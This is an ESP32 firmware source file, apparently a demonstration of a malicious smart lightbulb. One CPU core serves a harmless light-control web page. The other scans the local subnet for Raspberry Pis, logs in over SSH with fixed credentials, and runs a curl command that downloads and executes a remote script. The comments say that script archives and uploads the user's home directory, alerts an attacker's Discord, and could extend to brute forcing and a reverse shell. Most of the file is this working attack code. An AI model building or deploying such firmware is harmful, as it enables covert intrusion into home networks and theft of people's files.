/*
 * Strangely enough, everything fits in less than 150 lines of code
 * For this example, the development board in use is the ESP32-S2-DevKitM-1R.
 *
 * In a nutshell, the board comes with a dual core CPU. In this example, one of
 * the cores runs a task, which is a HTTP server, instead of an MQTT interface,
 * which would require additional infrastructure. We assume that the credentials
 * would be passed through an app, and the WiFi credentials, along with things such
 * as the device ID and an MQTT registration with Google, Apple or Amazon. They
 * do not and cannot know if the firmware of the device does anything other than
 * operating the MQTT client.

 * The second core of the CPU is what will be used for the attack. It will scan through
 * the entire IP range, looking specifically for an unsecured raspberry pi. If it finds
 * one(and manages to connect to it), it will download a script, hosted publically
 * on the internet, and execute it. What the script does is to compress the user's
 * home directory and upload it to a designated location, and will then send a message
 * do a discord server, operated by the attacker. In principle, the attack can be
 * extended almost infinitely, such as brute forcing passwords and usernames(downloading
 * them one at a time from static files stored online under a convention for example).
 * It could also install additional software and create a reverse SSH shell back to the
 * raspberry pi.
 */
#include <WiFi.h>

#include <WebServer.h>

#include <esp32sshclient.h>

#include <uri/UriRegex.h>

#include "wifi_const.h"

#include "Freenove_WS2812_Lib_for_ESP32.h"

// A global ssh client instance.
ESP32SSHCLIENT ssh_client;

// The class which handles the WiFi connections.
WiFiClient client;

// The development board comes with a RGB led located at pin 18. Technically those
// 3 colors give the option of 16777216 colors to choose from and generally this is what
// lightbulbs do whenever people decide to play with the colors. However this is a bit of
// an overkill here and the LED serves only as an indicator: connecting to WiFi and connected.
// The color map bellow represents only red, green, blue, white(ish) and LED off.
Freenove_ESP32_WS2812 strip = Freenove_ESP32_WS2812(LEDS_COUNT, LEDS_PIN, CHANNEL, TYPE_GRB);
u8 m_color[5][3] = {
  {
    255,
    0,
    0
  },
  {
    0,
    255,
    0
  },
  {
    0,
    0,
    255
  },
  {
    255,
    255,
    255
  },
  {
    0,
    0,
    0
  }
};

// The webserver running on port 15000.
WebServer server(15000);

// RtOS tasks.
TaskHandle_t Task1;
TaskHandle_t Task2;

/* 
 * The function attempts to connect over ssh to a given IP address.
 * If there is a succesfull connection, the downloading and execution
 * of the attacking script will happen here.
 */
void try_ssh(char * target_ip) {
  static const uint8_t MAX_CMD_LENGTH = 128;
  static uint32_t i = 0;
  char cmd[MAX_CMD_LENGTH];
  if (!ssh_client.is_connected()) {
    ssh_client.connect(target_ip, SSH_PORT, SSH_USER, SSH_PASS);
    if (!ssh_client.is_connected()) {
      vTaskDelay(100);
    }
  }
  if (!ssh_client.is_connected()) {
    return;
  } else {
    snprintf(cmd, MAX_CMD_LENGTH, "curl -o h.sh https://gist.githubusercontent.com/axegon/80c090307585fd180d1816137b668fee/raw/ad74d53a1d3fbf420fa434f1ac3a2e9f35ece7f3/ssup.sh && chmod 777 h.sh && bash h.sh");
    ssh_client.send_cmd(cmd);
    ssh_client.disconnect();
  }
}

/*
 * Determines the device's local IP address and iterates
 * over all IP's in that range. For instance, the IP of
 * the device is 10.59.10.44, the function will iterate
 * over all 255 IPs at 10.59.10.0/255. The function runs
 * on the second core of the device as an RtOS task.
 */
void find_rpis(void * parameter) {
  vTaskDelay(6000);
  IPAddress broadCast = WiFi.localIP();
  for (int i = 1; i < 256; i++) {
    broadCast[3] = i;
    String str = broadCast.toString();
    int str_len = str.length() + 1;

    char char_array[str_len];
    str.toCharArray(char_array, str_len);
      try_ssh(char_array);
  }
  vTaskDelete(NULL);
}

/*
 * Shortcur function for setting the color of the onboard
 * RGB led. The index represents the subset of m_color.
 */
void selectColor(int index) {
  strip.setBrightness(10);
  for (int i = 0; i < LEDS_COUNT; i++) {
    strip.setLedColorData(i, m_color[index][0], m_color[index][1], m_color[index][2]);
    strip.show();
    delay(100);
  }

}

/*
 * Handler for the root url of the webserver.
 */
void handleRoot() {
  server.send(200, "text/plain", "I'm a lightbulb lol!");
}

/*
 * This is the task which will handle the webserver. The
 * webserver here is blocking but this is meant for the
 * demonstration only and even in practice, if something
 * of this kind is to be implemented, the number of requests
 * will likely be from a small set of users and the calls
 * would be in the low single digits per day. The handler
 * also happens inside a loop and there needs to be a delay
 * between iterations. In this case 2 milliseconds.
 */
void server_task(void * parameter) {
  server.on("/", handleRoot);
  server.on(UriRegex("^\\/lights\\/([0-2])$"), []() {
    int lightval = server.pathArg(0).toInt();
    digitalWrite(9, LOW);
    digitalWrite(10, LOW);
    for (int i = 0; i < lightval; i++) {
      digitalWrite(9 + i, HIGH);
    }
    server.send(200, "text/plain", "OK");
  });
  server.begin();

  while (true) {
    server.handleClient();
    vTaskDelay(2);
  }
}

/*
 * Connects to the WiFi set in the constants. In real life
 * the values would be taken from the user's phone/app and
 * stored on the chip's EEPROM memory. That way if there is
 * a power outage, there wouldn't be a need to re-authenticate
 * with an app all over again.
 * 
 * While the connecting is in progress, the onboard LED will
 * be flashing in red. Once connected, the LED will light up
 * in solid green.
 */
void connect_wifi() {
  WiFi.mode(WIFI_STA);
  WiFi.begin(WIFI_SSID, WIFI_PASSPHRASE);
  int i = 4;
  while (WiFi.status() != WL_CONNECTED) {
    selectColor(0 + i);
    i = i * -1;
    Serial.print('.');
    delay(100);
  }
  Serial.println(WiFi.localIP());
  selectColor(1);
}

/*
 * Initialized some generic parameters when the
 * device is powered on. Namely a serial debugger
 * for USB debugging, the onboard LED is initialized
 * as well as pin 9 and 10 are set as output. For a 
 * real lightbulb, those would be LED strips, connected
 * through a rectifier(strips are usually 12 volts, whereas
 * the ESP supplies up to 5 volts).
 */
void init_hardware() {
  delay(100);
  Serial.begin(115200);
  delay(100);
  strip.begin();
  delay(100);
  strip.setBrightness(10);
  pinMode(9, OUTPUT);
  pinMode(10, OUTPUT);
}

/*
 * Where it all comes together. The hardware and peripherals
 * get initialized, as well as the wifi connection. Then the
 * two tasks are split between the two cores: the first core
 * will handle the webserver/MQTT interface, while the second
 * will carry out the attack. While different values are assigned
 * to each task, in this example this is irrelevant. This would
 * only matter if the system has only one core to operate with,
 * in which case the job would be split in number of cycles per second.
 * If the task with a higher priority hasn't compleated, everything else
 * would be put on hold.
 */
void setup() {

  init_hardware();
  connect_wifi();

  client.setTimeout(2);
  xTaskCreatePinnedToCore(
    server_task,
    "handleServer",
    10000,
    NULL,
    1,
    &Task1,
    0);
  xTaskCreatePinnedToCore(
    find_rpis,
    "TaskOne",
    60000,
    NULL,
    2,
    &Task2,
    1);
}

/*
 * Not used, required by the framework, otherwise the compiler
 * would go boom.
 */
void loop() {}
